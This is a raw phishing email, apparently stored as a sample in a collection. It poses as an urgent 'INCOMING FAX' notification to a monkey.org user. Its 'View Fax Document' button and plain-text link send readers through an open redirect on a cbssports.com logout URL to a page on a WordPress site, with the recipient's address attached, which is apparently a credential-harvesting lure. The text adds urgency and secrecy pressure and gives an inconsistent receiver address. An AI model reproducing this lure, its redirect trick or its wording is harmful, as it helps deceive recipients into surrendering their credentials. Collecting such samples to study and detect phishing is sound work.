@@ -1,0 +1,215 @@
+Return-Path: kyemma@kyemma.com
+Delivered-To: jose@monkey.org
+X-FDA: 84027871074.11.2D38917
+Received: from cc4087.inmotionhosting.com (cc4087.inmotionhosting.com
+ [216.194.165.97])
+	by imf09.b.hostedemail.com (Postfix) with ESMTP id 2CF6A180005
+	for <jose@monkey.org>; Thu, 23 Oct 2025 02:58:34 +0000 (UTC)
+Authentication-Results: imf09.b.hostedemail.com;
+	dkim=pass header.d=kyemma.com header.s=default header.b=q9epWqIu;
+	dmarc=none;
+	spf=pass (imf09.b.hostedemail.com: domain of kyemma@kyemma.com designates
+ 216.194.165.97 as permitted sender) smtp.mailfrom=kyemma@kyemma.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1761188315;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=HCZlmKZU93z3OtUVeOt1up5GDPpccZVfLVJ1zAlKG+w=;
+	b=BigCqln8mV3cTaZrUj6KWg2iG7t7vEycTaextegBGIIi07xiRAxb1zBdDdOjgYjlzbIh13
+	kwf19g4dHV/cAF00hYnI8U7c34O/BjfWgMphYP+G2cjZ3EWmY15GkNL8yMyyeXBzllwt/z
+	EdND0NjUJ/ldHdvxUYH14JbRAI3OAAU=
+ARC-Authentication-Results: i=1;
+	imf09.b.hostedemail.com;
+	dkim=pass header.d=kyemma.com header.s=default header.b=q9epWqIu;
+	dmarc=none;
+	spf=pass (imf09.b.hostedemail.com: domain of kyemma@kyemma.com designates
+ 216.194.165.97 as permitted sender) smtp.mailfrom=kyemma@kyemma.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1761188315; a=rsa-sha256;
+	cv=none;
+	b=l+H11ObP8+s8Wg3PG/o2woPUC33bjKDTPGnzAQvBCv4iKFAvui1iqan/u+s1e5LuBULuyX
+	r2WkCcHILEakz8iusS3EF5lNWI+8WnkrnMQUVgiMmwUIY0JNn9vYIC5pf4BECrzf6pGxNn
+	Rt5sWnunbvX8Qykl1AzNOZkmec9jwB0=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=kyemma.com;
+	s=default; h=Message-Id:Date:MIME-Version:Content-Type:To:Subject:From:Sender
+	:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:Content-Description:
+	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
+	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
+	List-Post:List-Owner:List-Archive;
+	bh=HCZlmKZU93z3OtUVeOt1up5GDPpccZVfLVJ1zAlKG+w=; b=q9epWqIuAFAr7tUlphc1XVGwAc
+	9DcVLTKLY5huamtqAtllFbaj8y7w5k5UBmFvYQvHfwltaS7+c8FF3XcmgDUz3Kf0qOm4XQRzLwLBF
+	mse1hk8aly2LoP5Xnewq6Dj/Iw4mqW8N4Q9M4Nk0mMqDITib2fd+GbAiVqnWI+CtszYhuFHPHxFw+
+	/+YOGBEDhijzzZ7G+sPSFE4FVZyaAtvgB3Uvyv5Md+8IXy+no9+JArTtuf44KpGuKY272NsRoMa+D
+	2iiAoX8AyiTjtQCWJSRkKj4gCp53G+oY2h4Hk4+VEEEMHpt6d1IsvI1txQ31YLnI0XttMjE66v986
+	jGzL4PeQ==;
+Received: from [205.234.144.48] (port=55909 helo=WIN-BUNS25TD77J)
+	by cc4087.inmotionhosting.com with esmtpsa  (TLS1.2) tls
+ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.98.2)
+	(envelope-from <kyemma@kyemma.com>)
+	id 1vBPvp-0000000Cdvh-1qmM
+	for jose@monkey.org;
+	Tue, 21 Oct 2025 20:54:37 -0700
+From: "FAX monkey.org" <kyemma@kyemma.com>
+Subject: INCOMING FAX
+To: <jose@monkey.org>
+Content-Type: multipart/alternative;
+ boundary="Ax1uVYGKHC5Wkmyex=_rz6zqIVoZVCudrq"
+MIME-Version: 1.0
+Date: Tue, 21 Oct 2025 20:54:36 -0700
+Priority: urgent
+X-Priority: 1
+Importance: high
+Message-Id: <213620251054203880869603-529527699F@kyemma.com>
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - cc4087.inmotionhosting.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - kyemma.com
+X-Get-Message-Sender-Via: cc4087.inmotionhosting.com: authenticated_id:
+ kyemma@kyemma.com
+X-Authenticated-Sender: cc4087.inmotionhosting.com: kyemma@kyemma.com
+X-Rspamd-Queue-Id: 2CF6A180005
+X-Stat-Signature: r8xnshpo8hcc7nztp6ujya3eaoyy34sa
+X-Rspam-User: 
+X-Spam-Status: No, score=2.90
+X-Rspamd-Server: rspam04
+X-HE-Tag: 1761188314-399487
+X-HE-Meta: 
+ U2FsdGVkX194vjaNISySVhTwOk1AVzS9zLg7d5/IgbOQjr1BXBFK/OOw5DYPCS15wbiMVVQsS0W/Y2TvyfG6Y/agQz24RIiamvtKrHbjWw9TLaags8DPhvF+9GRRdkGehq8UzBenIeeLoJeps6Dgh3NzWS32tr/UCSoXUfPUTzxZLoC1SiL/N3xAd3Q6NFFfUdP+MtWXArVPA5C1+OoaPVje3AmV+o60PgIDHNk1RGnwuZmXH5P0XZFl4CpI8fyLlOJ2hRr1KSoePWuNamEQ/pz36TJCzI/I8gXkO20V728/aN9mee/rpyNcSo9nMdCKffitsP7F9DPRzQFmzgGmU8SBQK4OKifcU2vzoqJFryMQQlwWP5/p7a4zPSzlkMF+32XIu1Dp9cxqigJ3L2BbjbbWiTelq7zb5uZaNfgcUeLG8h49bLT4UCnTwALb8j/eZESxFWCS/GIJ12d9rVbhG8ZAnNUg+753lODY+REE8mwrAfdpFJtxLzRj3kXBHC4/+CIFBqybOy7ugcXImM5zaBvxQ9iHU980Gdv56bTwUb4TJ+AdSRtoYIY5Jz4pkObpeBvBPxtYKDYp8rD/B5BC2nv1Cr2QnowK/ZpEjpuoi82zVaUIz2G2BXbbpHy06e8PyPIwr1pf4gdo9lJgRmB8aNopsny1EPECR8HNXv8h7SxLtD6Rqy7eU+PHhx3Do3qXNBZibH3Ybeb/N9kOMOUoKF8Mn9WlZff1KeBr3AHq+ssaGcFqXa8hIIzPkLjFht+llaHGEPBSWr3+nxbQsbXLcFoCSkiw7TDdNe8VXiPnSSVBCbAZY4pDyjYhb7LgqUDswXZGi0Ikmsvnu9tT4sU9C1Z/MT4x6v4jm0xyJLemKqMw5sAQCudm/K0CtBJgwqRXlDF3cwsMftdrbvnKwVI5wFSlaVAneYhfHXaY3e/jc595doDI7cl9NkcrGeQ2OtBtOyXt6OMfbtKzEOlC+3jEFUEh8zV
+ WYjLGQA8q+6CTOYypcxe+mLsScTR2elOdmeipcIYRH0Bn+PXR3Jx3oj6tt8xudu4GDF1U0zfS+AIsNEahVBtpc06uaTwAb8+yiPuXHYRx5lCat683ZVyNZlztXHzZ1o7TSS4Pbv5p5OWMtFf2QhS5EekCh3Wd7vvZKX8IJLBuKuAJlyjxfZ1uNh91cj+EvN3SAn+rJWdI/OwkY8WHaXD8sTZ8X7Ch1yJ0kx6T3gHLRlyic8JffjE6cVQOczLkG9EuV8CQaccE2rjHkUBuf8GXPIvwUN/B5qFxXsG/BoRdqMx61wK3Xil+uAm/+JKGWjhZyNfcTZSUAW6IzEFSlR0eplRir6Bl15wnqB/REit5WfxQnSyayZnJ5NrXrIUHHcpjdJeW6/qm0f4Yg+J84K6MhUM+gDVtrj9NbEPKN9FmFB5cs0twjPjdSU0+8SV6cnajE9sxR56cjVIdt0+Ciag9S/WyUY2VREeFp317hTbHgxcivlvZ+IUBtn3pLMoZqr6Jd/C7
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 414
+
+This is a multi-part message in MIME format
+
+--Ax1uVYGKHC5Wkmyex=_rz6zqIVoZVCudrq
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+
+INCOMING FAX
+
+YOU HAVE RECEIVED AN IMPORTANT FAX DOCUMENT THAT IS PENDING YOUR IMMED=
+IATE REVIEW.
+
+Fax Delivery Details:
+
+Message Number: 0162
+
+Attachment Type: PDF Document
+
+Sender CSID: (759-818-0162)
+
+Received On: Tue, March 25, 2025 at 11:58:08 PM
+
+Total Pages: 2
+
+Receiver Email: advancedsatellites@advsatllc.com
+
+View Fax Document https://www.cbssports.com/user/logout/?redirectUrl=3D=
+https://www.drsacon.com/wp-includes/widgets/webcode.html#jose@monkey.o=
+rg
+
+FAX STATUS: PENDING REVIEW
+
+If you do not want to receive files or were not expecting this fax, pl=
+ease get in touch with support or disregard this message.
+
+WARNING: This message is intended solely for advancedsatellites@advsat=
+llc.com only. Please do not share or forward this email to anyone.
+
+wetyu
+
+--Ax1uVYGKHC5Wkmyex=_rz6zqIVoZVCudrq
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-=
+8">
+  <title>INCOMING FAX</title>
+ </head>
+ <body> <P class=3D"x_x_MsoNormal" style=3D"margin: 0in 0in 0pt; font-=
+family: Calibri, sans-serif; font-size: 11pt; background-color: rgb(25=
+5, 255, 255);"><SPAN style=3D"font-family: Calibri, sans-serif, serif,=
+ EmojiFont; font-size: x-large;"><STRONG><SPAN style=3D"color: rgb(68,=
+ 114, 196);">INCOMING FAX</SPAN></STRONG></SPAN></P> <HR width=3D"98%"=
+ size=3D"4" align=3D"left" style=3D"color: rgb(243, 147, 39); font-fam=
+ily: wf_segoe-ui_normal, 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-s=
+erif, serif, EmojiFont; font-size: 15px; margin-left: 0px;" noshade=3D=
+"noshade"> <P class=3D"x_x_MsoNormal" style=3D"margin: 0in 0in 0pt; fo=
+nt-family: Calibri, sans-serif; font-size: 11pt; background-color: rgb=
+(255, 255, 255);"><STRONG><SPAN style=3D"color: rgb(68, 114, 196); fon=
+t-family: Calibri, sans-serif, serif, EmojiFont;">YOU HAVE RECEIVED AN=
+ IMPORTANT FAX DOCUMENT THAT IS PENDING YOUR IMMEDIATE REVIEW.</SPAN><=
+/STRONG></p><p class=3D"x_x_MsoNormal" style=3D"margin: 0in 0in 0pt; f=
+ont-family: Calibri, sans-serif; font-size: 11pt; background-color: rg=
+b(255, 255, 255);"><STRONG>&nbsp;</STRONG></P><table width=3D"600" cla=
+ss=3D"x_x_MsoNormalTable" style=3D"background: white; width: 6.25in; c=
+olor: rgb(33, 33, 33); font-family: 'times new roman'; font-size: 15px=
+;" border=3D"0" cellpadding=3D"0"> <tr><td valign=3D"top" style=3D"pad=
+ding: 0.75pt;"> <P class=3D"x_x_MsoNormal" style=3D"margin: 0in 0in 0p=
+t; font-family: Calibri, sans-serif; font-size: 11pt;"><STRONG>&nbsp;&=
+nbsp;<SPAN style=3D"font-family: Calibri, sans-serif, serif, EmojiFont=
+;">&nbsp;</SPAN><U>Fax Delivery Details:</U></STRONG></p><p class=3D"x=
+_x_MsoNormal" style=3D"margin: 0in 0in 0pt; font-family: Calibri, sans=
+-serif; font-size: 11pt;"><STRONG>&nbsp;&nbsp;</STRONG></p><p class=3D=
+"x_x_MsoNormal" style=3D"margin: 0in 0in 0pt; font-family: Calibri, sa=
+ns-serif; font-size: 11pt;"><STRONG>&nbsp;&nbsp;&nbsp;Message Number: =
+&nbsp; &nbsp; &nbsp;&nbsp;</STRONG>0162</p><p class=3D"x_x_MsoNormal" =
+style=3D"margin: 0in 0in 0pt; font-family: Calibri, sans-serif; font-s=
+ize: 11pt;"><STRONG>&nbsp;&nbsp; Attachment Type:&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;<SPAN style=3D"font-family: Calibri, sans-serif, =
+serif, EmojiFont;">&nbsp;PDF Document</SPAN></STRONG></p><p class=3D"x=
+_x_MsoNormal" style=3D"margin: 0in 0in 0pt; font-family: Calibri, sans=
+-serif; font-size: 11pt;">&nbsp;&nbsp;&nbsp;<STRONG>Sender CSID:&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<SPAN style=3D"font-family: Calibr=
+i, sans-serif, serif, EmojiFont;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&n=
+bsp;</SPAN></STRONG>(759-818-0162)</p><p class=3D"x_x_MsoNormal" style=
+=3D"margin: 0in 0in 0pt; font-family: Calibri, sans-serif; font-size: =
+11pt;">&nbsp;&nbsp;<SPAN style=3D"font-family: Calibri, sans-serif, se=
+rif, EmojiFont;">&nbsp;</SPAN><STRONG>Received On:&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;<SPAN style=3D"font-family: Calibri, sans-serif, serif, EmojiFon=
+t;">&nbsp;Tue, March 25, 2025</SPAN></STRONG>&nbsp;at 11:58:08 PM</p><=
+p class=3D"x_x_MsoNormal" style=3D"margin: 0in 0in 0pt; font-family: C=
+alibri, sans-serif; font-size: 11pt;">&nbsp;&nbsp;<SPAN style=3D"font-=
+family: Calibri, sans-serif, serif, EmojiFont;">&nbsp;</SPAN><STRONG>T=
+otal Pages:&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nb=
+sp; &nbsp;</STRONG>2</p><p class=3D"x_x_MsoNormal" style=3D"margin: 0i=
+n 0in 0pt; font-family: Calibri, sans-serif; font-size: 11pt;"><STRONG=
+>&nbsp;&nbsp; Receiver Email:&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;=
+ &nbsp;</STRONG>advancedsatellites@advsatllc.com</p><p style=3D"margin=
+-top: 20px; margin-left: 58px;"><A style=3D"padding: 10px 15px; border=
+-radius: 5px; color: white; font-family: Calibri, sans-serif; font-siz=
+e: 14px; display: inline-block; background-color: rgb(68, 114, 196); t=
+ext-decoration-line: none;" href=3D"https://www.cbssports.com/user/log=
+out/?redirectUrl=3Dhttps://www.drsacon.com/wp-includes/widgets/webcode=
+=2Ehtml#jose@monkey.org" target=3D"_blank" rel=3D"noopener noreferrer"=
+>View Fax Document</A></p><p class=3D"x_x_MsoNormal" style=3D"margin: =
+0in 0in 0pt; font-family: Calibri, sans-serif; font-size: 11pt;">&nbsp=
+;&nbsp;<SPAN style=3D"font-family: Calibri, sans-serif, serif, EmojiFo=
+nt;">&nbsp;</SPAN><STRONG>FAX STATUS: PENDING REVIEW</STRONG></P></TD>=
+</TR></TABLE> <P style=3D"color: rgb(33, 33, 33); font-family: wf_sego=
+e-ui_normal, 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif, serif,=
+ EmojiFont; font-size: 15px; background-color: rgb(255, 255, 255);">&n=
+bsp;</p><p class=3D"x_x_MsoNormal" style=3D"margin: 0in 0in 0pt; font-=
+family: Calibri, sans-serif; font-size: 11pt; background-color: rgb(25=
+5, 255, 255);">If you do not want to receive files or were not expecti=
+ng this fax, please get in touch with support or disregard this messag=
+e.</p><p class=3D"x_x_MsoNormal" style=3D"margin: 0in 0in 0pt; color: =
+rgb(255, 0, 0); font-family: Calibri, sans-serif; font-size: 9pt; back=
+ground-color: rgb(255, 255, 255);"><STRONG>WARNING: This message is in=
+tended solely for advancedsatellites@advsatllc.com only. Please do not=
+ share or forward this email to anyone.</STRONG></P>wetyu</body>
+ </html>
+
+--Ax1uVYGKHC5Wkmyex=_rz6zqIVoZVCudrq--
+
+
